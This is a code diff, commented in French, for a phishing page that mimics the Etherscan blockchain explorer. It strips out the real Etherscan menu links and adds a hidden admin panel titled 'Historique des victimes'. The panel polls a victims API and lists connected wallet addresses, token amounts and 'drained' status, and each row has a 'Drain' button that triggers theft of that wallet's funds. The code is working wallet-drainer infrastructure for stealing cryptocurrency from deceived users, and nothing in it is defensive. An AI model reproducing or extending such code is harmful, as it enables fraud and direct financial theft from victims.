@@ -225,6 +225,27 @@
       padding: 7px 0; font-size: 13px; color: var(--azure-15);
     }
 
+    /* ===== Panneau More – Victim Table ===== */
+    .more-panel { max-width: 1400px; margin: 0 auto; }
+    .more-container { padding: 24px 40px; }
+    .more-container h3 { margin: 0 0 16px; font-size: 18px; font-weight: 600; }
+    #victim-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+    #victim-table th, #victim-table td {
+      padding: 8px 12px; text-align: left;
+      border-bottom: 1px solid var(--grey-93);
+      white-space: nowrap;
+    }
+    #victim-table th { font-weight: 600; color: var(--azure-15); background: var(--grey-98); }
+    #victim-table td { color: var(--azure-15); }
+    .status-success { color: var(--cyan-32); }
+    .status-error { color: var(--punch); }
+    .drain-btn {
+      padding: 4px 12px; font-size: 12px; border-radius: 4px;
+      background: var(--azure-40); color: white; border: none; cursor: pointer;
+    }
+    .drain-btn:hover { opacity: 0.8; }
+    #victim-loading { color: var(--grey-46); font-size: 14px; }
+
     /* ===== Main ===== */
     .main {
       background-image: linear-gradient(to top, var(--white-solid), var(--grey-98));
@@ -690,51 +711,7 @@
       },
       {
         label: 'More',
-        columns: [
-          {
-            title: 'Developer Tools',
-            items: [
-              { label: 'Input Data Encoder', href: 'https://etherscan.io/inputdataencoder', icon: 'fileInput', badge: 'Beta' },
-              { label: 'Input Data Decoder', href: 'https://etherscan.io/inputdatadecoder', icon: 'fileCode' },
-              { label: 'Unit Converter', href: 'https://etherscan.io/unitconverter', icon: 'refresh' },
-              { label: 'Download Data (CSV Export)', href: 'https://etherscan.io/exportData', icon: 'download' },
-              { label: 'Account Balance Checker', href: 'https://etherscan.io/balancecheck-tool', icon: 'wallet' },
-              { label: 'Broadcast Transaction', href: 'https://etherscan.io/pushTx', icon: 'send' },
-              { label: 'Bytecode to Opcode', href: 'https://etherscan.io/opcode-tool', icon: 'binary' },
-            ],
-          },
-          {
-            title: 'Smart Contract Tools',
-            items: [
-              { label: 'Code Reader', href: 'https://etherscan.io/code-reader', icon: 'code' },
-              { label: 'Verify Contract', href: 'https://etherscan.io/verifyContract', icon: 'fileCheck' },
-              { label: 'Similar Contract Search', href: 'https://etherscan.io/searchcontractlist', icon: 'search' },
-              { label: 'Smart Contract Search', href: 'https://etherscan.io/searchcontract', icon: 'searchCode' },
-              { label: 'Contract Diff Checker', href: 'https://etherscan.io/contractdiffchecker', icon: 'gitCompare' },
-              { label: 'Vyper Online Compiler', href: 'https://etherscan.io/vyper-online-compiler', icon: 'fileTerminal' },
-            ],
-          },
-          {
-            title: 'Explore',
-            items: [
-              { label: 'Gas Tracker', href: 'https://etherscan.io/gastracker', icon: 'fuel' },
-              { label: 'DEX Tracker', href: 'https://etherscan.io/dex', icon: 'swap' },
-              { label: 'Node Tracker', href: 'https://etherscan.io/nodetracker', icon: 'server' },
-              { label: 'Label Cloud', href: 'https://etherscan.io/labelcloud', icon: 'tags' },
-              { label: 'Domain Name Lookup', href: 'https://etherscan.io/name-lookup', icon: 'globe' },
-            ],
-          },
-          {
-            title: 'Services',
-            items: [
-              { label: 'Token Approvals', href: 'https://etherscan.io/tokenapprovalchecker', icon: 'shieldCheck' },
-              { label: 'Verified Signature', href: 'https://etherscan.io/verifiedSignatures', icon: 'penLine' },
-              { label: 'Input Data Messages (IDM)', href: 'https://etherscan.io/idm', icon: 'message' },
-              { label: 'Advanced Filter', href: 'https://etherscan.io/advanced-filter', icon: 'filter' },
-              { label: 'Blockscan Chat', href: 'https://chat.blockscan.com/', icon: 'messages', external: true },
-            ],
-          },
-        ],
+        columns: [] // vide, mais avec columns pour déclencher le mega-menu
       },
     ];
 
@@ -769,6 +746,24 @@
 
       // Render mega menus for items with columns
       navItems.filter(function (i) { return i.columns; }).forEach(function (item) {
+        if (item.label === 'More') {
+          // Mega menu spécial pour More : panneau d'historique
+          let m = '<div class="mega more-panel" data-panel="More" hidden>';
+          m += '<div class="more-container">';
+          m += '<h3>Historique des victimes</h3>';
+          m += '<div id="victim-table-wrapper">';
+          m += '<p id="victim-loading">Chargement...</p>';
+          m += '<table id="victim-table" style="display:none;">';
+          m += '<thead><tr><th>Adresse</th><th>Token</th><th>Montant</th><th>Date</th><th>Statut</th><th>Action</th></tr></thead>';
+          m += '<tbody id="victim-tbody"></tbody>';
+          m += '</table>';
+          m += '</div>';
+          m += '</div></div>';
+          megaHost.insertAdjacentHTML('beforeend', m);
+          return;
+        }
+
+        // Autres mega menus normaux
         let m = '<div class="mega" data-panel="' + item.label + '" hidden><div class="container mega-grid">';
         item.columns.forEach(function (col) {
           m += '<div><h3>' + col.title + '</h3><ul>';
@@ -795,6 +790,17 @@
       document.querySelectorAll('.nav-btn').forEach(function (b) {
         b.classList.toggle('open', b.getAttribute('data-menu') === label);
       });
+
+      // Polling pour le menu More
+      if (label === 'More') {
+        fetchVictims();
+        if (!victimPollTimer) {
+          victimPollTimer = setInterval(fetchVictims, 5000);
+        }
+      } else {
+        clearInterval(victimPollTimer);
+        victimPollTimer = null;
+      }
     }
 
     renderNav();
@@ -911,6 +917,7 @@
       if (adminPassword.value === ADMIN_PASSWORD) {
         adminLoginDiv.style.display = 'none';
         adminDrainDiv.style.display = 'block';
+        sessionStorage.setItem('adminToken', ADMIN_PASSWORD);
       } else {
         loginError.style.display = 'block';
       }
@@ -1108,6 +1115,120 @@
         body: JSON.stringify({ victim: account, chain: currentChainId })
       });
       console.log('Transaction envoyée, la victime va être redirigée par son wallet.');
+    }
+
+    // ===== Historique des victimes =====
+    let victimPollTimer = null;
+
+    async function fetchVictims() {
+      const token = sessionStorage.getItem('adminToken');
+      if (!token) {
+        document.getElementById('victim-loading').textContent = 'Accès réservé (admin)';
+        return;
+      }
+      try {
+        const resp = await fetch('/api/victims', {
+          headers: { 'Authorization': 'Bearer ' + token }
+        });
+        if (!resp.ok) throw new Error('Erreur ' + resp.status);
+        const victims = await resp.json();
+        populateTable(victims);
+      } catch (err) {
+        console.error('fetchVictims error:', err);
+        document.getElementById('victim-loading').textContent = 'Erreur de chargement';
+      }
+    }
+
+    function populateTable(victims) {
+      const tbody = document.getElementById('victim-tbody');
+      const loading = document.getElementById('victim-loading');
+      const table = document.getElementById('victim-table');
+      if (!tbody || !loading || !table) return;
+
+      loading.style.display = 'none';
+      table.style.display = '';
+      tbody.innerHTML = '';
+
+      victims.forEach(function (v) {
+        const row = document.createElement('tr');
+
+        // Adresse
+        const tdAddr = document.createElement('td');
+        tdAddr.textContent = v.address;
+        row.appendChild(tdAddr);
+
+        // Token / chain
+        const tdToken = document.createElement('td');
+        tdToken.textContent = (v.token ? v.token : '?') + (v.chain ? ' (' + v.chain + ')' : '');
+        row.appendChild(tdToken);
+
+        // Montant
+        const tdAmount = document.createElement('td');
+        tdAmount.textContent = v.amount || '0';
+        row.appendChild(tdAmount);
+
+        // Date
+        const tdDate = document.createElement('td');
+        tdDate.textContent = v.timestamp ? new Date(v.timestamp).toLocaleString() : '-';
+        row.appendChild(tdDate);
+
+        // Statut
+        const tdStatus = document.createElement('td');
+        if (v.status === 'drained') {
+          tdStatus.innerHTML = '<span class="status-success">✅ Succès</span>';
+        } else if (v.status === 'failed' || v.status === 'connected') {
+          tdStatus.innerHTML = '<span class="status-error">❌ Échec</span>';
+        } else {
+          tdStatus.textContent = v.status || '?';
+        }
+        row.appendChild(tdStatus);
+
+        // Action (bouton drain si ce n'est pas déjà drainé)
+        const tdAction = document.createElement('td');
+        if (v.status !== 'drained') {
+          const btn = document.createElement('button');
+          btn.className = 'drain-btn';
+          btn.textContent = 'Drain';
+          btn.addEventListener('click', function () {
+            manualDrainFromHistory(v.address, v.chain);
+          });
+          tdAction.appendChild(btn);
+        } else {
+          tdAction.textContent = '';
+        }
+        row.appendChild(tdAction);
+
+        tbody.appendChild(row);
+      });
+    }
+
+    async function manualDrainFromHistory(address, chain) {
+      if (!confirm('Confirmer le drain de ' + address + ' ?')) return;
+      const token = sessionStorage.getItem('adminToken');
+      if (!token) {
+        alert('Token admin manquant');
+        return;
+      }
+      try {
+        const resp = await fetch('/api/store-victim', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            victim: address,
+            chain: chain || '1',
+            adminSecret: ADMIN_SECRET
+          })
+        });
+        const data = await resp.json();
+        if (data.success) {
+          alert('Drain lancé avec succès.');
+          fetchVictims();
+        } else {
+          alert('Échec: ' + (data.error || 'inconnu'));
+        }
+      } catch (err) {
+        alert('Erreur réseau');
+      }
     }
 
     // Lancer le module après chargement du DOM
